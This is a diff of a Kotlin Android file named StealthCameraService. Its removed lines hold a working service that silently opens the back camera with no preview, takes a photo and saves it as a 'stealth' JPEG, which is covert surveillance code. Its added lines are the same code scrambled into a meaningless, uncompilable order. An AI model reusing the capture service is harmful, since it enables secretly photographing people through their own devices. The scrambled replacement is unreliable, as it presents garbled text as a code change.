@@ -1,170 +1,170 @@
 package com.anti.rootadbcontroller.services
 
-import android.app.Service
-import android.content.Intent
-import android.graphics.SurfaceTexture
-import android.hardware.camera2.CameraAccessException
-import android.hardware.camera2.CameraCaptureSession
-import android.hardware.camera2.CameraCharacteristics
-import android.hardware.camera2.CameraDevice
-import android.hardware.camera2.CameraManager
-import android.hardware.camera2.CaptureRequest
-import android.media.ImageReader
-import android.os.Environment
-import android.os.Handler
-import android.os.HandlerThread
 import android.os.IBinder
-import android.util.Log
-import android.view.Surface
-import java.io.File
-import java.io.FileOutputStream
-import java.io.IOException
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
-
-class StealthCameraService : Service() {
-
-    private var cameraDevice: CameraDevice? = null
-    private var captureSession: CameraCaptureSession? = null
-    private lateinit var imageReader: ImageReader
-    private lateinit var backgroundThread: HandlerThread
-    private lateinit var backgroundHandler: Handler
-
-    override fun onBind(intent: Intent?): IBinder? = null
-
-    override fun onCreate() {
-        super.onCreate()
         startBackgroundThread()
+            backgroundThread.join()
+                stopSelf()
+        }
+                },
+        cameraDevice = null
+}
+import android.os.HandlerThread
+        super.onCreate()
+        try {
+                image.close()
+            onDisconnected(camera)
+                    }
+        cameraDevice?.close()
     }
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        openCamera()
-        return START_NOT_STICKY
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        closeCamera()
-        stopBackgroundThread()
-    }
-
-    private fun startBackgroundThread() {
-        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
-        backgroundHandler = Handler(backgroundThread.looper)
-    }
+import android.os.Handler
+    override fun onCreate() {
+        backgroundThread.quitSafely()
+                saveImage(bytes)
+        override fun onError(camera: CameraDevice, error: Int) {
+                        Log.e(TAG, "Failed to configure capture session")
+        captureSession = null
+        private const val TAG = "StealthCameraService"
+import android.os.Environment
 
     private fun stopBackgroundThread() {
-        backgroundThread.quitSafely()
-        try {
-            backgroundThread.join()
-        } catch (e: InterruptedException) {
-            Log.e(TAG, "Error stopping background thread", e)
-        }
-    }
-
-    private fun openCamera() {
-        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
-        try {
-            val cameraId = manager.cameraIdList.firstOrNull {
-                manager.getCameraCharacteristics(it)
-                    .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
-            } ?: return
-
-            imageReader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
-            imageReader.setOnImageAvailableListener({ reader ->
-                val image = reader.acquireLatestImage()
-                val buffer = image.planes[0].buffer
-                val bytes = ByteArray(buffer.remaining())
                 buffer.get(bytes)
-                saveImage(bytes)
-                image.close()
-                stopSelf()
-            }, backgroundHandler)
-
-            manager.openCamera(cameraId, stateCallback, backgroundHandler)
-        } catch (e: CameraAccessException) {
-            Log.e(TAG, "Cannot access camera", e)
-        }
-    }
-
-    private val stateCallback = object : CameraDevice.StateCallback() {
-        override fun onOpened(camera: CameraDevice) {
-            cameraDevice = camera
-            createCaptureSession()
-        }
-
-        override fun onDisconnected(camera: CameraDevice) {
-            camera.close()
-            cameraDevice = null
-        }
-
-        override fun onError(camera: CameraDevice, error: Int) {
-            onDisconnected(camera)
-        }
-    }
-
-    private fun createCaptureSession() {
-        try {
-            val surfaceTexture = SurfaceTexture(10)
-            val surface = Surface(surfaceTexture)
-            val captureRequestBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
-            captureRequestBuilder.addTarget(imageReader.surface)
-            captureRequestBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
-
-            cameraDevice?.createCaptureSession(
-                listOf(surface, imageReader.surface),
-                object : CameraCaptureSession.StateCallback() {
-                    override fun onConfigured(session: CameraCaptureSession) {
-                        captureSession = session
-                        capture()
-                    }
 
                     override fun onConfigureFailed(session: CameraCaptureSession) {
-                        Log.e(TAG, "Failed to configure capture session")
-                    }
-                },
-                backgroundHandler,
-            )
-        } catch (e: CameraAccessException) {
-            Log.e(TAG, "Error creating capture session", e)
-        }
-    }
+        captureSession?.close()
+    companion object {
+import android.media.ImageReader
+    override fun onBind(intent: Intent?): IBinder? = null
 
-    private fun capture() {
-        try {
-            val captureBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
-            captureBuilder.addTarget(imageReader.surface)
-            captureSession?.capture(captureBuilder.build(), null, null)
-        } catch (e: CameraAccessException) {
-            Log.e(TAG, "Error capturing image", e)
+                val bytes = ByteArray(buffer.remaining())
         }
-    }
 
     private fun closeCamera() {
-        captureSession?.close()
-        captureSession = null
-        cameraDevice?.close()
-        cameraDevice = null
-        imageReader.close()
-    }
 
-    private fun saveImage(bytes: ByteArray) {
-        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
-        val file =
-            File(
-                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
-                "stealth_$timeStamp.jpg",
-            )
-        try {
-            FileOutputStream(file).use { it.write(bytes) }
-            Log.d(TAG, "Image saved to ${file.absolutePath}")
-        } catch (e: IOException) {
-            Log.e(TAG, "Failed to save image", e)
+import android.hardware.camera2.CaptureRequest
+
+    }
+                val buffer = image.planes[0].buffer
+            cameraDevice = null
+                    }
+
+    }
+import android.hardware.camera2.CameraManager
+    private lateinit var backgroundHandler: Handler
+        backgroundHandler = Handler(backgroundThread.looper)
+                val image = reader.acquireLatestImage()
+            camera.close()
+                        capture()
+    }
         }
-    }
+import android.hardware.camera2.CameraDevice
+    private lateinit var backgroundThread: HandlerThread
+        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
+            imageReader.setOnImageAvailableListener({ reader ->
+        override fun onDisconnected(camera: CameraDevice) {
+                        captureSession = session
+        }
+            Log.e(TAG, "Failed to save image", e)
+import android.hardware.camera2.CameraCharacteristics
+    private lateinit var imageReader: ImageReader
+    private fun startBackgroundThread() {
+            imageReader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
 
-    companion object {
-        private const val TAG = "StealthCameraService"
+                    override fun onConfigured(session: CameraCaptureSession) {
+            Log.e(TAG, "Error capturing image", e)
+        } catch (e: IOException) {
+import android.hardware.camera2.CameraCaptureSession
+    private var captureSession: CameraCaptureSession? = null
+
+
+        }
+                object : CameraCaptureSession.StateCallback() {
+        } catch (e: CameraAccessException) {
+            Log.d(TAG, "Image saved to ${file.absolutePath}")
+import android.hardware.camera2.CameraAccessException
+    private var cameraDevice: CameraDevice? = null
     }
-}
+            } ?: return
+            createCaptureSession()
+                listOf(surface, imageReader.surface),
+            captureSession?.capture(captureBuilder.build(), null, null)
+            FileOutputStream(file).use { it.write(bytes) }
+import android.graphics.SurfaceTexture
+
+        stopBackgroundThread()
+                    .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
+            cameraDevice = camera
+            cameraDevice?.createCaptureSession(
+            captureBuilder.addTarget(imageReader.surface)
+        try {
+import android.content.Intent
+class StealthCameraService : Service() {
+        closeCamera()
+                manager.getCameraCharacteristics(it)
+        override fun onOpened(camera: CameraDevice) {
+
+            val captureBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+            )
+import android.app.Service
+
+        super.onDestroy()
+            val cameraId = manager.cameraIdList.firstOrNull {
+    private val stateCallback = object : CameraDevice.StateCallback() {
+            captureRequestBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
+        try {
+                "stealth_$timeStamp.jpg"
+import java.util.Locale
+    override fun onDestroy() {
+        try {
+
+            captureRequestBuilder.addTarget(imageReader.surface)
+    private fun capture() {
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
+import java.util.Date
+
+        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
+    }
+            val captureRequestBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+
+            File(
+import java.text.SimpleDateFormat
+    }
+    private fun openCamera() {
+        }
+            val surface = Surface(surfaceTexture)
+    }
+        val file =
+import java.io.IOException
+        return START_NOT_STICKY
+
+            Log.e(TAG, "Cannot access camera", e)
+            val surfaceTexture = SurfaceTexture(10)
+        }
+        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
+import java.io.FileOutputStream
+        openCamera()
+    }
+        } catch (e: CameraAccessException) {
+        try {
+            Log.e(TAG, "Error creating capture session", e)
+    private fun saveImage(bytes: ByteArray) {
+import java.io.File
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        }
+            manager.openCamera(cameraId, stateCallback, backgroundHandler)
+    private fun createCaptureSession() {
+        } catch (e: CameraAccessException) {
+
+import android.view.Surface
+
+            Log.e(TAG, "Error stopping background thread", e)
+
+
+            )
+    }
+import android.util.Log
+    }
+        } catch (e: InterruptedException) {
+            }, backgroundHandler)
+    }
+                backgroundHandler
+        imageReader.close()
